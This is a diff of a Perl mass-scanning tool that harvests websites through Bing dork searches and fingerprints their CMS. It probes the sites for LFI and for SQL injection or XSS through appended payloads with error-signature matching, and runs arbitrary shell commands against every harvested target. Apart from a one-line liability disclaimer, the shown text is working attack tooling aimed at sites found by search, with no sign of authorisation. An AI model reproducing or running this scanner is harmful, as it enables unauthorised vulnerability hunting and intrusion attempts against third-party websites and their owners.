+  my $httpd = $response->headers_as_string;
+  
+  checkextrainfo();
+  if($URL1 !~ /http:\/\//) { $URL1 = "http://$URL1"; };	
+  print color 'bold';
+  print "    HTTP:   ";
+  print color RESET;
+  print "HTTP/1.1 $status\n";
+
+  print color 'bold';
+  print "    SERVER: ";
+  print color RESET;
+  if (defined $serverheader) {
+    print "$serverheader \n";
+  }else{
+	print "Undefined\n";
+  } 
+  for my $ERROR (@ERROR) {
+	if ( $html =~ /$ERROR/ ){
+	  $ERROR1=$ERROR;
+	  checkerrortype();
+	}
+  }
+  for my $MODULETYPE (@MODULETYPE) {
+	if ( $html =~ /$MODULETYPE/ ){
+	  $MODULETYPE1=$MODULETYPE;
+	  checkcmstype();
+	}
+  }
+  print color 'bold';
+  print "    SCAN:   ";
+  print color RESET;
+  if (($response->is_success and !$response->previous) && ($html =~ m/$yes/i) && ($html !~ m/$no/i)){
+	print color 'green';
+	if (defined $cms) {
+      print "$cms\n";
+	}elsif (defined $cmails) {
+      print "$1\n";
+	}else{
+      print "$URL1\n";
+	}
+    print color RESET;
+	open (INFO, '>>scan.txt');
+	if (defined $cmails) {
+      print INFO "$1\n";
+	}else{
+      print INFO "$URL1\n";
+	}
+    close (INFO);
+	if (defined $cmails){
+      open (LOG, '>>scan2.txt');
+      print LOG "$URL1\n   $1\n";
+	}
+    close (LOG);
+  }else{
+	print color 'red';
+    print "No Results Found! \n";
+	print color RESET;
+	
+  }
+}	
+############################################################################################################################################################################################
+############################################################################################################################################################################################
+sub checkerrortype { 
+  print color 'bold';
+  print "    ERROR:  ";
+  print color RESET;
+  print color 'yellow';
+  for my $ERROR (@ERROR) {
+  	if ($ERROR1 eq $ERROR){
+      if ($ERROR eq $ERROR[0]){
+	    print "Possible Lfi Vulnerability!\n";
+      }else{
+	    print "$ERROR\n";
+	  }
+	}  
+  }
+  print color RESET;
+}	  	
+############################################################################################################################################################################################
+############################################################################################################################################################################################
+sub checkcmstype {
+  print color 'bold';
+  print "    CMS:    ";
+  print color RESET;
+  print color 'yellow';
+  for my $MODULETYPE (@MODULETYPE) {
+  	if ($MODULETYPE1 eq $MODULETYPE){
+      if ($MODULETYPE eq $MODULETYPE[0]){ print "WordPress\n";
+      }elsif ($MODULETYPE eq $MODULETYPE[1]){ print "Joomla\n";
+      }elsif ($MODULETYPE eq $MODULETYPE[2]){ print "Textpattern\n";
+      }elsif ($MODULETYPE eq $MODULETYPE[3]){ print "SMF\n";
+      }elsif ($MODULETYPE eq $MODULETYPE[4]){ print "phpBB\n";
+      }elsif (($MODULETYPE eq $MODULETYPE[5]) || ($MODULETYPE eq $MODULETYPE[6])){ print "vBulletin\n";
+      }elsif ($MODULETYPE eq $MODULETYPE[7]){ print "MyBB\n";
+      }elsif (($MODULETYPE eq $MODULETYPE[8]) || ($MODULETYPE eq $MODULETYPE[9])) { print "CloudFlare\n";
+      }elsif ($MODULETYPE eq $MODULETYPE[10]){ print "Drupal\n";
+      }elsif ($MODULETYPE eq $MODULETYPE[11]){ print "PostNuke\n";
+      }elsif ($MODULETYPE eq $MODULETYPE[12]){ print "ATutor\n";
+      }elsif ($MODULETYPE eq $MODULETYPE[13]){ print "PHP-Nuke\n";
+      }elsif (($MODULETYPE eq $MODULETYPE[14]) || ($MODULETYPE eq $MODULETYPE[15])){ print "Moodle\n";
+      }elsif ($MODULETYPE eq $MODULETYPE[16]){ print "AdaptCMS\n";
+      }elsif ($MODULETYPE eq $MODULETYPE[17]){ print "SilverStripe\n";
+      }elsif ($MODULETYPE eq $MODULETYPE[18]){ print "MODx\n";
+      }elsif ($MODULETYPE eq $MODULETYPE[19]){ print "XOOPS\n";
+      }elsif (($MODULETYPE eq $MODULETYPE[20]) || ($MODULETYPE eq $MODULETYPE[21])) { print "OsCommerce\n";
+      }elsif (($MODULETYPE eq $MODULETYPE[22]) || ($MODULETYPE eq $MODULETYPE[23])) { print "PrestaShop\n";
+      }elsif ($MODULETYPE eq $MODULETYPE[24]){ print "b2evolution\n";
+      }elsif (($MODULETYPE eq $MODULETYPE[25]) || ($MODULETYPE eq $MODULETYPE[26])) { print "Magento\n";
+      }elsif (($MODULETYPE eq $MODULETYPE[27]) || ($MODULETYPE eq $MODULETYPE[28])) { print "Zen Cart\n";
+      }elsif (($MODULETYPE eq $MODULETYPE[29]) || ($MODULETYPE eq $MODULETYPE[30])) { print "Concrete5\n";
+      }elsif ($MODULETYPE eq $MODULETYPE[31]){ print "OpenCart\n";}
+	}
+  }	 
+  print color RESET;
+}
+############################################################################################################################################################################################
+############################################################################################################################################################################################
 sub finmodule {
   $list = "scan.txt";
   if (-e $list){  
@@ -944,20 +1174,19 @@ sub finmodule {
   unlink 'serach.txt';
   exit();
 }
-
-###################################################################		
+############################################################################################################################################################################################
+############################################################################################################################################################################################
 sub fincontinuemodule {
   my $lc = 0;
   open $file, "<", "scan.txt";
   $lc++ while <$file>;
   print color 'green';
-  print "[!] [$lc Target(s) Found!]\n";
+  print "[!] $lc Target(s) Found!\n";
   print color RESET;
   close $file;
-  unlink 'scan.txt' if !defined $sqlmap;
 }
-
-###################################################################		
+############################################################################################################################################################################################
+############################################################################################################################################################################################
 sub negative {	
   print color 'red';
   print "[!] No Results Found!\n";
@@ -967,8 +1196,26 @@ sub negative {
   print "SCAN FINISHED!\n";
   print color RESET;
 }
-###################################################################		
-###################################################################		
+############################################################################################################################################################################################
+############################################################################################################################################################################################
+sub subfin {
+  print color 'red';
+  timer();
+  print "SCAN FINISHED!\n";
+  print color RESET;
+}
+############################################################################################################################################################################################
+############################################################################################################################################################################################
+sub desclaimer {
+  print "[ ] ----------------------------------------------------------------------- [ ]\n";
+  print "[ ] This is a pentest tool! We will not be responsible or liable, directly  [ ]\n";
+  print "[ ]    or indirectly in any way for any loss or damage of any kind          [ ]\n";
+  print "[ ]                incurred as result of our program use !!                 [ ]\n";
+  print "[ ] ----------------------------------------------------------------------- [ ]\n";
+  osinfo();
+}
+############################################################################################################################################################################################
+############################################################################################################################################################################################
 sub submsearch {
   testconection();
   $checksearchscanlist = "search.txt";
@@ -976,23 +1223,24 @@ sub submsearch {
   dorklist();
   msearch();
 }
-###################################################################		
+############################################################################################################################################################################################
+############################################################################################################################################################################################
 ## bgn sub msearch
 sub msearch {
-  my @strings=('fr', 'it', 'ie', 'us', 'br', 'ma', 'dz', 'se', 'nl', 'il', 'ca', 'pt', 'pl', 'eg', 'tn', 'ae', 'qa', 'af', 'iq', 'ch', 'mx', 've', 'es', 'ro', 'ru', 'jp', 'id', 'de', 'ua', 'sa', 'ok', 'fi', 'no', 'cz', 'lu', 'uy');
-  $myrand = $strings[int rand @strings];
+  $browserlang = $browserlangs[int rand @browserlangs];
   scandetail();
   print color 'bold yellow';
   print "[+] RANDOM SEARCH:: ";
   print color RESET;
-  print color 'red';
-  print "BING [bing.". $myrand . "]\n";
+  print color 'cyan';
+  print "BING [bing.". $browserlang . "]\n";
   print color RESET;
+  
   if (defined $dork) {
     print color 'bold yellow';
     print "[+] SEARCH:: ";
     print color RESET;
-    print color 'red';
+    print color 'cyan';
     print "$dork ";
     print color RESET;
 	my $pattern = '.txt|.log';
@@ -1002,29 +1250,6 @@ sub msearch {
       print "\n";
 	}
   }
-  if (defined $output) {
-    print color 'bold yellow';
-    print "[+] OUTPUT:: ";
-    print color RESET;
-    print color 'red';
-    print "$output\n";
-    print color RESET;
-  }
-  if ((defined $mip) || (defined $mserver)){
-    print color 'bold yellow';
-    print "[+] INFO:: ";
-    print color RESET;
-    print color 'red';
-	if (defined $mip){
-      print "Get Server IP ";
-	}
-	if (defined $mserver){
-      print "Get Server Software";
-	}  
-    print color RESET;
-	print "\n";
-  }
-  
   print color 'bold';
   print "[ ] ----------------------------------------------------------------------- [ ]\n";
   timer();
@@ -1035,14 +1260,13 @@ sub msearch {
   open (FILE, "dorks.txt");
   while (my $dork = <FILE>) {
     chomp $dork;
-	if ((!defined $mxss) && (!defined $exploit) && (!defined $mlfi) && (!defined $command) && (!defined $misup) && (!defined $validation_text) && (!defined $sqlmap) && (!defined $madmin) && (!defined $msubdomain) && (!defined $mjoomrfi) && (!defined $mwpadf) && (!defined $mports) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $replace) && (!defined $with) && (!defined $mhttpd) && (!defined $mmails)) {
+	if ((!defined $mxss) && (!defined $exploit) && (!defined $mlfi) && (!defined $command) && (!defined $misup) && (!defined $validation_text) && (!defined $sqlmap) && (!defined $madmin) && (!defined $msubdomain) && (!defined $mjoomrfi) && (!defined $mwpadf) && (!defined $mports) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $replace) && (!defined $with) && (!defined $mmails)) {
       print color 'bold magenta';
 	  timer();
 	  print "SCAN:: $dork \n\n";
       print color RESET;
 	}
 	$mlevel = $mlevel;
-
     $s_results = $dork;
 	if (defined $Target){
       $s_results = "ip%3A".$dork;
@@ -1052,7 +1276,7 @@ sub msearch {
     sub scan(){
       my @search;
       for($npages=0;$npages<=$mlevel;$npages+=10){
-       my $google=("http://www.bing.com/search?q=".$s_results."&first=".$npages."&FORM=PERE&cc=".$myrand);
+       my $google=("http://www.bing.com/search?q=".$s_results."&first=".$npages."&FORM=PERE&cc=".$browserlang);
 		my $search=$ua->get("$google");
         $search->as_string;
         my $Res=$search->content;
@@ -1063,53 +1287,49 @@ sub msearch {
 			if (defined $Target) { $URL=~s/\/.*//s; }
 			if ($repeat{$URL}) {
 			}else{
-	          if ((!defined $mxss) && (!defined $exploit) && (!defined $mlfi) && (!defined $misup) && (!defined $validation_text) && (!defined $sqlmap) && (!defined $madmin) && (!defined $msubdomain) && (!defined $mjoomrfi) && (!defined $mwpadf) && (!defined $mports) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $mhttpd) && (!defined $replace) && (!defined $with) && (!defined $mmails)) {
-	            print color 'bold yellow';
+	          if ((!defined $mxss) && (!defined $exploit) && (!defined $mlfi) && (!defined $misup) && (!defined $validation_text) && (!defined $sqlmap) && (!defined $madmin) && (!defined $msubdomain) && (!defined $mjoomrfi) && (!defined $mwpadf) && (!defined $mports) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $mmails) && (!defined $replace) && (!defined $with)) {
+	            print color 'bold';
 			    print "[!] TARGET: ";
 	            print color RESET;
-	            print color 'green';
+	            print color 'blue';
                 print "http://$URL\n";
 	            print color RESET;
-				if ((defined $mip) || (defined $mserver)){
-                  print color 'bold yellow';
-	              print "    INFO:   ";
-	              print color RESET;	
-
-			      if (defined $mip) {
-			        use Socket;
-                    my $checkip=$URL;	 
-                    $checkip=~ s/\/.*//s;
-                    $ip = inet_ntoa(inet_aton($checkip));
-                    print "IP: $ip ";
-			      }
-			      if (defined $mserver) {
-			        if($URL !~ /http:\/\//) { $URL = "http://$URL"; };
-			        $request = HTTP::Request->new('GET', $URL);
-                    my $response = $ua->request($request);
-			        print "Server: ";
-			        if ($response->is_success) {
-                      $serverheader = $response->server;
-                      if (defined($serverheader)) {
-                        printf("%s", $response->server, " ");
-                      }else{ 
-					    printf("Undefined"); 
-					  }
-                    }else{
-				      printf("%s", $response->status_line, " ");
-				    }
-			      }
-				  print "\n";
-			    }
+			    $URL1=$URL;
+				checkextrainfo();
+				if($URL !~ /http:\/\//) { $URL = "http://$URL"; };
+				$request = HTTP::Request->new('GET', $URL);
+                my $response = $ua->request($request);
+                my $html = $response->content;
+                my $status = $response->code;
+                my $serverheader = $response->server;
+	            print color 'bold';
+	            print "    HTTP:   ";
+	            print color RESET;
+	            print "HTTP/1.1 $status\n";
+                print color 'bold';
+                print "    SERVER: ";
+                print color RESET;
+                if (defined $serverheader) {
+                  print "$serverheader\n";
+                }else{
+	              print "Undefined\n";
+                }
+                for my $ERROR (@ERROR) {
+	              if ( $html =~ /$ERROR/ ){
+	                $ERROR1=$ERROR;
+	                checkerrortype();
+	              }
+                }
+                for my $MODULETYPE (@MODULETYPE) {
+	              if ( $html =~ /$MODULETYPE/ ){
+	                $MODULETYPE1=$MODULETYPE;
+	                checkcmstype();
+				  }
+                }
 		        print "[ ]............................................................................ \n";
 			  }
               open (TEXT, '>>search.txt');
-			  if (defined $replace) {
-			    if ($URL =~ m/$with/i) {
-			      print TEXT "http://$URL\n";
-		        }	
-			  }else{
-                print TEXT "http://$URL\n";
-			  }
+			  print TEXT "$URL\n";
               close (TEXT);
 			  $repeat{$URL}++;
 			}
@@ -1142,8 +1362,7 @@ sub msearch {
 	print color RESET;
 	close $file;
     print color RESET;
-	
-	if ((!defined $mxss) && (!defined $exploit) && (!defined $mlfi) && (!defined $misup) && (!defined $validation_text) && (!defined $sqlmap) && (!defined $madmin) && (!defined $msubdomain) && (!defined $mjoomrfi) && (!defined $mwpadf) && (!defined $mports) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $mhttpd) && (!defined $replace) && (!defined $with) && (!defined $mmails)) {
+	if ((!defined $mxss) && (!defined $exploit) && (!defined $mlfi) && (!defined $misup) && (!defined $validation_text) && (!defined $sqlmap) && (!defined $madmin) && (!defined $msubdomain) && (!defined $mjoomrfi) && (!defined $mwpadf) && (!defined $mports) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $mmails) && (!defined $replace) && (!defined $with)) {
       print color 'green';
 	  if (defined $output) {
 		if (-e $output){ unlink $output};
@@ -1176,16 +1395,15 @@ sub msearch {
     print color RESET;
   }
 } ## end sub msearch
-###################################################################	
-###################################################################		
+############################################################################################################################################################################################
+############################################################################################################################################################################################
 ## bgn misup
 sub misup {
   if (-e 'scan.txt'){ unlink 'scan.txt';}
   if (-e 'validated.txt'){ unlink 'validated.txt';}
   testconection();
-  if (!defined $mlevel) {
+ if (!defined $mlevel){
     targetlist();
-	scandetail();
   }
   print color 'bold';
   print "[ ] ----------------------------------------------------------------------- [ ]\n";
@@ -1207,96 +1425,56 @@ sub misup {
     $URL = checkurltype($URL);
 	if($URL !~ /http:\/\//) { $URL = "http://$URL"; };	
 	my $printarget = $URL;
-    if (defined $mnoshow) {
-	  print color 'bold magenta';
-	  timer();
-	  print "[$count/";
-	  countsearchlist();
-	  print "]\n";
-	  print color RESET;
-	  print color 'bold yellow';
-	  print "[!] TARGET: ";
-	  print color RESET;
-	  print color 'yellow';
-	  print "$printarget\n";
-	  print color RESET;
-	}
+	print color 'bold magenta';
+	timer();
+	print "[$count/";
+	countsearchlist();
+	print "]\n";
+	print color RESET;
+	print color 'bold';
+	print "[!] TARGET: ";
+	print color RESET;
+	print color 'blue';
+	print "$printarget\n";
+	print color RESET;
     $URL = control($URL);
-    if (!defined $mnoshow) {
-  	  print color 'bold yellow';
-	  if (defined $exploit){
-	    print color 'bold yellow';
-	    print "    EXPL:   ";
-	    print color RESET;
-	    print "$exploit\n";
-	  }	
-	  if (defined $replace){
-	    print color 'bold yellow';
-	    print "    EXPL:   ";
-	    print color RESET;
-	    print "Replace\n";
-	  }	
-	  print color 'bold yellow';
-	  print "    VALID:  ";
-	  print color RESET;
-	}
     $URL1 = $URL;
 	$URL1 =~ s/ //g;
-    $request = HTTP::Request->new('GET', $URL1);
-    my $response = $ua->request($request);
-    my $html = $response->content;
-    my $status = $response->code;
-	my $pattern='not found|404|error';
-    if (($status==200) && (!$response->previous) && ($html !~ m/$pattern/i)){
-      if (!defined $mnoshow) {
-	    print color 'green';
-        print "Valid! HTTP: $status\n";
-	    print color RESET;
-	  }
-      open (INFO, '>>scan.txt');
-      print INFO "$printarget\n";
-      close (INFO);
-	}else{
-      if (!defined $mnoshow) {
-	    print color 'red';
-        print "Not Valid!\n";
-	    print color RESET;
-      }
-    }
-    if (!defined $mnoshow) {
-      print "[ ]............................................................................ \n";
-	}
+	$yes='a';
+    $no = 'iiiiiix';
+	checkedurl();
+    print "[ ]............................................................................ \n";
   }
   close(TEXT);
-  if ((!defined $validation_text) && (!defined $mxss) && (!defined $mlfi) && (!defined $command) && (!defined $validation_text) && (!defined $sqlmap) && (!defined $madmin) && (!defined $msubdomain) && (!defined $mjoomrfi) && (!defined $mwpadf) && (!defined $mports) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $mhttpd) && (!defined $mmails)) {
-    finmodule();
+  if (-e "validated".getlist()) {unlink "validated_".getlist();}
+  if (-e 'scan.txt') {
+    unlink 'search.txt';
+    use File::Copy qw(copy);
+    copy 'scan.txt', "validated_".getlist();
+    use File::Copy qw(copy);
+    copy 'scan.txt', 'search.txt';
+	fincontinuemodule();
+	print color 'green';
+    print "[!] Results saved in $Bin/validated_".getlist()."!\n";
+	print color RESET;
+    subfin();
   }else{
-	if (-e 'scan.txt') {
-	  unlink 'search.txt';
-      use File::Copy qw(copy);
-      copy 'scan.txt', 'search.txt';
-      use File::Copy qw(copy);
-      copy 'scan.txt', "validated_".getlist();
-	  fincontinuemodule();
-	  print color 'green';
-      print "[!] Results saved in $Bin/validated_".getlist()."!\n";
-	  print color RESET;
-	  unlink 'scan.txt';
-	}else{
-      finmodule();
-	}
+	print color 'red';
+    print "[!] No Results Found!\n";
+    subfin();
+  }
+  if ((!defined $validation_text) && (!defined $mxss) && (!defined $mlfi) && (!defined $command) && (!defined $validation_text) && (!defined $sqlmap) && (!defined $madmin) && (!defined $msubdomain) && (!defined $mjoomrfi) && (!defined $mwpadf) && (!defined $mports) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $mmails)) {
+    exit();
   }
 }
-###################################################################		
-###################################################################		
+############################################################################################################################################################################################
+############################################################################################################################################################################################
 ## bgn mvalidation
 sub mvalidation {
   if (-e 'scan.txt'){ unlink 'scan.txt';}
-  if (-e 'validated.txt'){ unlink 'validated.txt';}
   testconection();
-  if (!defined $mlevel) {
+ if (!defined $mlevel){
     targetlist();
-	scandetail();
   }
   print color 'bold';
   print "[ ] ----------------------------------------------------------------------- [ ]\n";
@@ -1318,97 +1496,55 @@ sub mvalidation {
     $URL = checkurltype($URL);
 	if($URL !~ /http:\/\//) { $URL = "http://$URL"; };	
 	my $printarget = $URL;
-    if (!defined $mnoshow) {
-	  print color 'bold magenta';
-	  timer();
-	  print "[$count/";
-	  countsearchlist();
-	  print "]\n";
-	  print color RESET;
-	  print color 'bold yellow';
-	  print "[!] TARGET: ";
-	  print color RESET;
-	  print "$printarget\n";
-	}  
+	print color 'bold magenta';
+	timer();
+	print "[$count/";
+	countsearchlist();
+	print "]\n";
+	print color RESET;
+	print color 'bold';
+	print "[!] TARGET: ";
+	print color RESET;
+	print color 'blue';
+	print "$printarget\n";
+	print color RESET;
     $URL = control($URL);
-    if (!defined $mnoshow) {
-	  if (defined $exploit){
-	    print color 'bold yellow';
-	    print "    EXPL:   ";
-	    print color RESET;
-	    print "$exploit\n";
-	  }	
-	  if (defined $replace){
-	    print color 'bold yellow';
-	    print "    EXPL:   ";
-	    print color RESET;
-	    print "Replace\n";
-	  }
-	  print color 'bold yellow';
-	  print "    VALID:  ";
-	  print color RESET;
-	}
     $URL1 = $URL;
 	$URL1 =~ s/ //g;
-    $request = HTTP::Request->new('GET', $URL1);
-    my $response = $ua->request($request);
-    my $html = $response->content;
-    my $status = $response->code;
-    if ($html =~ m/$validation_text/i){
-      if (!defined $mnoshow) {
-	    print color 'green';
-        print "Valid!\n";
-	    print color RESET;
-	    print color 'bold yellow';
-	    print "    HTTP:   ";
-	    print color RESET;
-	    print color 'green';
-	    print "HTTP/1.1 $status\n";
-	    print color RESET;
-	  }
-      open (INFO, '>>scan.txt');
-      print INFO "$printarget\n";
-      close (INFO);
-	}else{
-      if (!defined $mnoshow) {
-	    print color 'red';
-        print "Not Valid!\n";
-	    print color RESET;
-	  }
-	}
-    if (!defined $mnoshow) {
-      print "[ ]............................................................................ \n";
-	}
+    $yes = $validation_text;
+    $no = 'not found|404|not exist|ErrorDocument|Forbidden|The page you requested couldn\'t be found';
+	checkedurl();
+    print "[ ]............................................................................ \n";
   }
   close(TEXT);
-  if ((!defined $misup) && (!defined $mxss) && (!defined $mlfi) && (!defined $command) && (!defined $misup) && (!defined $sqlmap) && (!defined $madmin) && (!defined $msubdomain) && (!defined $mjoomrfi) && (!defined $mwpadf) && (!defined $mports) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $mhttpd) && (!defined $mmails)) {
-    finmodule();
+  if (-e "validated".getlist()) {unlink "validated_".getlist();}
+  if (-e 'scan.txt') {
+    unlink 'search.txt';
+    use File::Copy qw(copy);
+    copy 'scan.txt', "validated_".getlist();
+    use File::Copy qw(copy);
+    copy 'scan.txt', 'search.txt';
+	fincontinuemodule();
+	print color 'green';
+    print "[!] Results saved in $Bin/validated_".getlist()."!\n";
+	print color RESET;
+    subfin();
   }else{
-	if (-e 'scan.txt') {
-	  unlink 'search.txt';
-      use File::Copy qw(copy);
-      copy 'scan.txt', 'search.txt';
-      use File::Copy qw(copy);
-      copy 'scan.txt', "validated_".getlist();
-	  fincontinuemodule();
-	  print color 'green';
-      print "[!] Results saved in $Bin/validated_".getlist()."!\n";
-	  print color RESET;
-	  unlink 'scan.txt';
-	}else{
-      finmodule();
-	}
+	print color 'red';
+    print "[!] No Results Found!\n";
+    subfin();
+  }
+  if ((!defined $misup) && (!defined $mxss) && (!defined $mlfi) && (!defined $command) && (!defined $misup) && (!defined $sqlmap) && (!defined $madmin) && (!defined $msubdomain) && (!defined $mjoomrfi) && (!defined $mwpadf) && (!defined $mports) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $mmails)) {
+    exit();
   }
 }
-
-####################################################################
-####################################################################
+############################################################################################################################################################################################
+############################################################################################################################################################################################
 ## bgn mcommand
 sub mcommand {
   testconection();
-  if (!defined $mlevel) {
+ if ((!defined $mlevel) && (!defined $validation_text) && (!defined $misup)){
     targetlist();
-	scandetail();
   }
   print color 'bold';
   print "[ ] ----------------------------------------------------------------------- [ ]\n";
@@ -1422,7 +1558,6 @@ sub mcommand {
   while (my $URL = <TEXT>) {
     $count++;
 	chomp $URL;
-	$URL=control($URL);
     if($URL !~ /http:\/\//) { $URL = "http://$URL"; };
 	print color 'bold magenta';
 	timer();
@@ -1430,26 +1565,33 @@ sub mcommand {
 	countsearchlist();
 	print "]\n";
 	print color RESET;
-	print color 'bold yellow';
+	print color 'bold';
 	print "[!] TARGET: ";
 	print color RESET;
-	print color 'yellow';
+	print color 'blue';
     print "$URL \n";
+	print color RESET;
+    $URL1=$URL;
+    checkextrainfo();
 	
-	print color 'bold yellow';
+	print color 'bold';
 	print "    CMD:    ";
 	print color RESET;
 	
-	$commandfull = $command;
-	if ($commandfull =~ m/--TARGET/i) {
-	  $commandfull =~ s/--TARGET/$URL/g;
-	}elsif ($commandfull =~ m/--FULL_TARGET/i) {
-	  $commandfull =~ s/--FULL_TARGET/$URL/g;
+	$URL = control($URL);
+	
+	if ($command =~ /--TARGET/) {
+	  if (index($URL, 'http://') != -1) {
+	    $URL =~ s/http:\/\///g;
+	  }	  
+	  $URL =~ s/\/.*//g;
+	  $command =~ s/--TARGET/$URL/g;
+	  if($URL !~ /http:\/\//) { $URL = "http://$URL"; };
+	}elsif ($command =~ /FULL_TARGET/) {
+	  $command =~ s/--FULL_TARGET/$URL/g;
     }
-    #$commandfull = $command." ".$URL;
-
-	print "$commandfull\n";
-    system($commandfull); 
+	print "$command\n\n";
+    system($command); 
     
     print "\n[ ] ----------------------------------------------------------------------- [ ]\n";
   }
@@ -1458,98 +1600,12 @@ sub mcommand {
   print "SCAN FINISHED!\n";
   print color RESET;
   
-  if ((!defined $mxss) && (!defined $exploit) && (!defined $mlfi) && (!defined $sqlmap) && (!defined $madmin) && (!defined $msubdomain) && (!defined $mjoomrfi) && (!defined $mwpadf) && (!defined $mports) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $mhttpd) && (!defined $replace) && (!defined $with) && (!defined $mmails)) {
+  if ((!defined $mxss) && (!defined $exploit) && (!defined $mlfi) && (!defined $sqlmap) && (!defined $madmin) && (!defined $msubdomain) && (!defined $mjoomrfi) && (!defined $mwpadf) && (!defined $mports) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $replace) && (!defined $with) && (!defined $mmails)) {
     exit();
   }
 }
-###################################################################	
-###################################################################		
-## bgn mhttpd
-sub mhttpd {
-  if (-e 'scan.txt'){ unlink 'scan.txt';}
-  if (-e 'scan2.txt'){ unlink 'scan2.txt';}
-  testconection();
-  if (!defined $mlevel) {
-    targetlist();
-	scandetail();
-  }
-  print color 'bold';
-  print "[ ] ----------------------------------------------------------------------- [ ]\n";
-  timer();
-  print "STARTING HTTPD SCAN ...\n";
-  print "[ ] ----------------------------------------------------------------------- [ ]\n";
-  print color RESET;
-  forwait();
-  $count=0;
-  open (TEXT, 'search.txt');
-  while (my $URL = <TEXT>) {
-    $count++;
-	chomp $URL;
-    $URL = checkurltype($URL);
-	if($URL !~ /http:\/\//) { $URL = "http://$URL"; };	
-	my $printarget = $URL;
-	if (index($URL, 'http://') != -1) {
-	  $URL =~ s/http:\/\///g;
-	}
-	$URL =~ s/\/.*//s;
-	if($URL !~ /http:\/\//) { $URL = "http://$URL"; };	
-	print color 'bold magenta';
-	timer();
-	print "[$count/";
-	countsearchlist();
-	print "]\n";
-	print color RESET;
-	print color 'bold yellow';
-	print "[!] TARGET: ";
-	print color RESET;
-	print color 'yellow';
-	print "$printarget\n";
-	print color RESET;
-	print color 'bold yellow';
-  	print "    HTTPD:  ";
-    print color RESET;
-    $URL1 = $URL;
-	$URL1 =~ s/ //g;
-    $useragent = LWP::UserAgent->new;
-    $resp = $useragent->head($URL1);
-	my $httpd = $resp->headers_as_string;
-    if ($resp->is_success) {
-      print color 'green';
-      print "[!] $httpd\n";
-      print color RESET;
-      open (INFO, '>>scan.txt');
-      print INFO "$printarget\n";
-      close (INFO);
-      open (INFO, '>>scan2.txt');
-      print INFO "$printarget\n   $httpd\n";
-      close (INFO);
-    }else{
-      print color 'red';
-      print "\n    [!] Cannot reltreive headers!\n";
-      print color RESET;
-    }
-	print "[ ]............................................................................ \n\n";
-  }
-  close(TEXT);
-  if ((!defined $mxss) && (!defined $sqlmap) && (!defined $mlfi) && (!defined $mjoomrfi) && (!defined $mwpadf) && (!defined $madmin) && (!defined $msubdomain) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $mmails) && (!defined $mports)) {
-	unlink 'scan2.txt';
-    finmodule();
-  }else{
-	if (-e 'scan.txt') {
-      if (-e "httpd_".getlist()) {unlink "httpd_".getlist();}
-      use File::Copy qw(copy);
-      copy 'scan2.txt', "httpd_".getlist();
-	  fincontinuemodule();
-	  print color 'green';
-      print "[!] Results saved in $Bin/httpd_".getlist()."!\n";
-	  print color RESET;
-	}
-	unlink 'scan.txt';
-	unlink 'scan2.txt';
-  }
-}
-###################################################################		
-####################################################################
+############################################################################################################################################################################################
+############################################################################################################################################################################################
 ## bgn mxss
 sub mxss {
   if (-e 'scan.txt'){ unlink 'scan.txt';}
@@ -1557,7 +1613,6 @@ sub mxss {
   XSS();
   if ((!defined $mlevel) && (!defined $validation_text) && (!defined $misup)){
     targetlist();
-	scandetail();
   }
   print color 'bold';
   print "[ ] ----------------------------------------------------------------------- [ ]\n";
@@ -1580,10 +1635,10 @@ sub mxss {
 	countsearchlist();
 	print "]\n";
 	print color RESET;
-	print color 'bold yellow';
+	print color 'bold';
 	print "[!] TARGET: ";
 	print color RESET;
-	print color 'yellow';
+	print color 'blue';
 	print "$printarget\n";
 	print color RESET;
     $URL = control($URL);
@@ -1591,102 +1646,40 @@ sub mxss {
 	  $URL =~ s/%27//g if $URL =~ /%27/;
 	}
 	foreach $XSS(@XSS){
-	  print color 'bold yellow';
-	  print "    EXPL:   ";
-	  print color RESET;
-      print "$XSS \n";
-	  print color 'bold yellow';
-	  print "    VULN:   ";
-	  print color RESET;
       $URL1 = $URL.$XSS;
 	  $URL1 =~ s/ //g;
-      $request = HTTP::Request->new('GET', $URL1);
-      my $response = $ua->request($request);
-      my $html = $response->content;
-	  my $status = $response->code;
-	  my $pattern = 'MySQL|syntax|SQL|mysql_fetch_assoc|num_rows|ORA-01756|PostgreSQL|internal server error';
-	  my $off = 'not found|404|not exist|ErrorDocument|Forbidden';
-	  if(($html =~ m/$pattern/) && ($response->content !~ m/$off/)){
-	    print color 'green';
-        print "$URL1\n";
-	    print color RESET;
-	    print color 'bold yellow';
-	    print "    HTTP:   ";
-	    print color RESET;
-	    print color 'green';
-	    print "HTTP/1.1 $status\n";
-	    print color RESET;
-        print color 'bold yellow';
-        print "    ERROR:  ";
-        print color RESET;
-		my $pattern = '|error in your SQL syntax|MYSQL|mysql_fetch_array|mysql_fetch_assoc|mysql_num_rows|mysql_result';
-        if ($html =~ m/$pattern/i){ print "MySQL ";}
-		if ($html =~ m/internal server error/i) { print "Server error ";}
-        if ($html =~ m/ORA-01756/i) { print "Oracle ";}
-        if ($html =~ m/JDBC Driver/i) { print "JDBC_CFM2 ";}
-        if ($html =~ m/Microsoft OLE DB Provider/i) { print "MS-Access_ODBC ";}
-        if ($html =~ m/Unclosed quotation mark/i) { print "MSSQL_Uqm ";}
